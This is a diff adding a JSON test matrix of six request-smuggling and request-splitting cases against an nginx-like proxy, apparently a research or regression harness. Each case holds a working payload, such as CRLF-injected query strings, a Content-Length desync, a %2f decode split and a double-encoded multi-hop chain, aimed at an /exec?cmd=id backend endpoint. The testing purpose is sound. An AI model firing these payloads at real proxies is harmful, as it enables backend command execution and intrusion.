@@ -1,0 +1,105 @@
+{
+ "dialect": "ngx",
+ "build": "8d5ff1f2",
+ "prefix": "/api",
+ "cells": [
+  {
+   "family": "request_line_split",
+   "build": "8d5ff1f2",
+   "dialect": "ngx",
+   "source": "r14A",
+   "poc": "ev_r14_A_probe2.py",
+   "shape": "GET with %0d%0a in the query; upstream receives a second, 4-token request",
+   "expect": "exec",
+   "steps": [
+    {
+     "name": "attack",
+     "path": "/api/x?a%0d%0aGET%20/exec%3fcmd=id%0d%0aHost:%20u%0d%0a%20HTTP/1.1"
+    }
+   ]
+  },
+  {
+   "family": "body_replay_desync",
+   "build": "8d5ff1f2",
+   "dialect": "ngx",
+   "source": "r14A",
+   "poc": "ev_r14_A_probe2.py",
+   "shape": "Content-Length: 0 consumes only the head; trailing bytes become a second request",
+   "expect": "exec",
+   "steps": [
+    {
+     "name": "attack",
+     "raw": "GET /api/x HTTP/1.1\r\nHost: alpha.test\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\nGET /api/exec?cmd=id HTTP/1.1\r\nHost: alpha.test\r\nConnection: close\r\n\r\n"
+    }
+   ]
+  },
+  {
+   "family": "1xx_nesting",
+   "build": "8d5ff1f2",
+   "dialect": "ngx",
+   "source": "r9I+1xx",
+   "poc": "ev_1xx.py",
+   "shape": "upstream 100 is terminal; the following head is absorbed as the body",
+   "expect": "nested",
+   "peer": "inner",
+   "steps": [
+    {
+     "name": "attack",
+     "path": "/api/x"
+    }
+   ]
+  },
+  {
+   "family": "pct2f_split",
+   "build": "8d5ff1f2",
+   "dialect": "ngx",
+   "source": "r14A",
+   "poc": "ev_r14_A_probe2.py",
+   "shape": "GET /api/%2fexec%3fcmd=id; the proxy emits a decoded 3-token exec target",
+   "expect": "exec",
+   "steps": [
+    {
+     "name": "attack",
+     "path": "/api/%2fexec%3fcmd=id"
+    }
+   ]
+  },
+  {
+   "family": "config_quoted_space",
+   "build": "8d5ff1f2",
+   "dialect": "ngx",
+   "source": "cfgSpace",
+   "poc": "cspace.py",
+   "shape": "proxy_pass \"http://backend/exec \" - the quoted space splits the upstream line",
+   "expect": "exec",
+   "pass_uri": "\"http://backend/exec \"",
+   "steps": [
+    {
+     "name": "attack",
+     "path": "/api%3fcmd=id"
+    }
+   ]
+  },
+  {
+   "family": "multi_hop_chain",
+   "build": "8d5ff1f2",
+   "dialect": "ngx",
+   "source": "r15E",
+   "poc": "poc_r15_E_chain.py",
+   "shape": "double-encoded payload: hop 1 decodes %25, hop 2 splits and executes",
+   "expect": "exec",
+   "hop2": "8d5ff1f2",
+   "hop2_dialect": "ngx",
+   "hop2_prefix": "/",
+   "prefix": "/api",
+   "steps": [
+    {
+     "name": "attack",
+     "path": "/api/x%250d%250aGET%2520/exec%250d%250aHost:%2520u%250d%250a%250d%250a"
+    }
+   ],
+   "hop2_server_name": "127.0.0.1"
+  }
+ ],
+ "pass_uri": "/api"
+}
